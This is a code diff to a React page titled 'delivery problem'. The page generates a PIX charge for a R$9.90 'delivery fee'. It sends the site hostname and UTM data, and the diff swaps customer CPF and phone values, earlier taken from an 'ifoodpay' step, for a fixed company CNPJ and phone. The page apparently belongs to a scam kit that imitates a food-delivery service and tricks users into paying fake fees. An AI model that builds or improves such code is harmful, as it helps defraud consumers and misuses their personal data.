@@ -70,28 +70,22 @@ export default function ProblemaEntregaPage() {
     try {
       const utmParams = getUtmParams();
       
-      // Buscar CPF e telefone do localStorage (salvos no ifoodpay)
-      const savedCpf = localStorage.getItem('userCpf') || '';
-      const savedPhone = localStorage.getItem('userPhone') || '';
+      // Usar CNPJ e telefone fixos da empresa
+      const empresaCnpj = '34.224.999/0001-04';
+      const empresaPhone = '(11) 93110-1138';
       
       console.log('📋 Dados para gerar PIX:');
-      console.log('   - Nome:', userData?.name);
-      console.log('   - Email:', userData?.email);
-      console.log('   - CPF (localStorage):', savedCpf);
-      console.log('   - Telefone (localStorage):', savedPhone);
-      
-      if (!savedCpf || !savedPhone) {
-        alert('Dados do usuário não encontrados. Por favor, faça um novo pedido.');
-        setIsLoading(false);
-        return;
-      }
+      console.log('   - Nome:', userData?.name || 'Distribuidor Nacional de Açaí');
+      console.log('   - Email:', userData?.email || '');
+      console.log('   - CNPJ (fixo):', empresaCnpj);
+      console.log('   - Telefone (fixo):', empresaPhone);
       
       const payload = {
         hostname: window.location.hostname,
-        nome: userData?.name || 'Cliente',
-        email: userData?.email || '',
-        phone: savedPhone,
-        cpf: savedCpf,
+        nome: userData?.name || 'Distribuidor Nacional de Açaí',
+        email: userData?.email || 'contato@nacionalacai.com.br',
+        phone: empresaPhone,
+        cpf: empresaCnpj,
         amount: 990, // R$ 9,90 em centavos
         quantity: 1,
         productTitle: "Taxa de Entrega",
@@ -108,19 +102,24 @@ export default function ProblemaEntregaPage() {
         body: JSON.stringify(payload),
       });
 
+      console.log('📡 Response status:', response.status);
+      
       const data = await response.json();
+      console.log('📦 Response data:', data);
 
       if (data.success) {
+        console.log('✅ PIX gerado com sucesso!');
         setPixCode(data.pixData.code);
         setPixQrCode(data.pixData.qrCode);
         
         const cleanup = startPolling(data.pixData.transactionId);
         if (cleanup) setCleanupPolling(() => cleanup);
       } else {
-        alert('Erro ao gerar PIX. Tente novamente.');
+        console.error('❌ Erro na resposta:', data);
+        alert(`Erro ao gerar PIX: ${data.message || 'Tente novamente.'}`);
       }
     } catch (error) {
-      console.error('Erro:', error);
+      console.error('❌ Erro ao processar:', error);
       alert('Erro ao processar pagamento. Tente novamente.');
     } finally {
       setIsLoading(false);
